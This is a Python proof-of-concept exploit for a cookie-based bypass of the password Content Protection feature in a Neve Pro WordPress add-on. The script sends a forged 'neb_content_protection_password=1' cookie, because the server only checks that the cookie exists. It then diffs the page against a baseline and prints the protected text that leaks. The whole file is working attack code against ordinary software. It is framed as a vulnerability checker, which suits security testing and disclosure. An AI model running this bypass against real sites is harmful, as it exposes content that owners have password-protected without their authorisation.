#!/usr/bin/env python3

import argparse
import difflib
import html
import json
import re
import sys

try:
    import requests
except ImportError:
    sys.exit("[!] Missing dependency: pip install requests")

COOKIE_NAME = "neb_content_protection_password"
FORGED_COOKIE = {COOKIE_NAME: "1"}
FORM_MARKER = "neb-password-protected-content-fields"   # rendered password form
LOCKED_MARKER = "neb-protected-content"                 # wrapper of locked widget
UA = "Mozilla/5.0 (X11; Linux x86_64) PoC-NevePro-N1/1.0"


def fetch(url, cookies=None, timeout=15):
    r = requests.get(url, cookies=cookies, timeout=timeout,
                     headers={"User-Agent": UA}, allow_redirects=True)
    return r


def strip_tags(page_html):
    text = re.sub(r"<(script|style)[^>]*>.*?</\1>", " ", page_html, flags=re.S | re.I)
    text = re.sub(r"<[^>]+>", "\n", text)
    text = html.unescape(text)
    lines = [ln.strip() for ln in text.splitlines()]
    return [ln for ln in lines if ln]


def newly_visible_text(baseline, forged):
    """Lines of human-visible text present in the forged response but not in
    the baseline - i.e. the content the server released after the bypass."""
    diff = difflib.unified_diff(strip_tags(baseline), strip_tags(forged), n=0, lineterm="")
    added = []
    for line in diff:
        if line.startswith("+") and not line.startswith("+++"):
            added.append(line[1:].strip())
        # skip the page marker line unified_diff injects ("@@ ... @@")
    return [a for a in added if a and not a.startswith("@@")]


def check_page(url, timeout):
    result = {"url": url, "status": None, "leaked": []}

    baseline = fetch(url, timeout=timeout)
    if baseline.status_code != 200:
        result["status"] = f"error: HTTP {baseline.status_code} on baseline request"
        return result
    base_html = baseline.text

    if FORM_MARKER not in base_html and LOCKED_MARKER not in base_html:
        result["status"] = "no protection form on this page (not applicable)"
        return result

    forged = fetch(url, cookies=FORGED_COOKIE, timeout=timeout)
    if forged.status_code != 200:
        result["status"] = f"error: HTTP {forged.status_code} with forged cookie"
        return result

    form_gone = FORM_MARKER not in forged.text and LOCKED_MARKER not in forged.text
    leaked = newly_visible_text(base_html, forged.text)

    if form_gone and leaked:
        result["status"] = "VULNERABLE"
        result["leaked"] = leaked
    elif form_gone:
        result["status"] = "VULNERABLE (lock released; no distinct text diff found)"
    else:
        result["status"] = "not vulnerable (cookie had no effect)"
    return result


def main():
    banner = "\n".join([
        "=" * 68,
        " Neve Pro Addon",
        "=" * 68,
    ])
    ap = argparse.ArgumentParser(description="Neve Pro N-1 cookie bypass PoC")
    ap.add_argument("target", help="URL of a page using Content Protection (password mode)")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    args = ap.parse_args()

    if not args.json:
        print(banner)

    targets = [args.target]

    overall = 1
    results = []
    for url in targets:
        res = check_page(url, args.timeout)
        results.append(res)

        if args.json:
            continue
        print(f"\n[*] Testing: {url}")
        if res["status"] == "VULNERABLE":
            overall = 0
            print("    [+] VULNERABLE - server released protected content with forged cookie")
            print(f"    [+] Cookie sent: {COOKIE_NAME}=1  (value is irrelevant; isset() only)")
            for line in res["leaked"][:8]:
                print(f"    [+] leaked: {line[:100]}")
            if len(res["leaked"]) > 8:
                print(f"    [+] ... {len(res['leaked']) - 8} more line(s)")
        elif res["status"].startswith("VULNERABLE"):
            overall = 0
            print("    [+] VULNERABLE - password form disappeared with forged cookie")
        elif res["status"].startswith("no protection"):
            print("    [-] No Content Protection form on this page - skipping")
        else:
            print(f"    [-] {res['status']}")

    if args.json:
        print(json.dumps(results, indent=2))

    if not args.json:
        print()
        if overall == 0:
            print("[=] RESULT: VULNERABLE - password protection is decorative.")
        else:
            print("[=] RESULT: no bypass observed on the given page(s).")
    sys.exit(overall if not args.json else 0)


if __name__ == "__main__":
    main()
